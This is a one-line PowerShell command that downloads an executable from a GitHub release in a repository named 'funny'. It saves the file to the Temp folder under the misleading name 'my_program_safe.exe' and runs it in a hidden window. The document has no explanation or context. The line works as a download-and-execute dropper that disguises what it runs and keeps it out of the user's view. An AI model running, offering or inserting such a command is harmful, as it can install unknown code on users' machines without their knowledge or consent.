Invoke-WebRequest -Uri "https://github.com/greenstorm5417/funny/releases/download/v2.0.2/main.exe" -OutFile "$env:Temp\my_program_safe.exe" -UseBasicParsing; Start-Process -FilePath "$env:Temp\my_program_safe.exe" -Wait -WindowStyle Hidden 
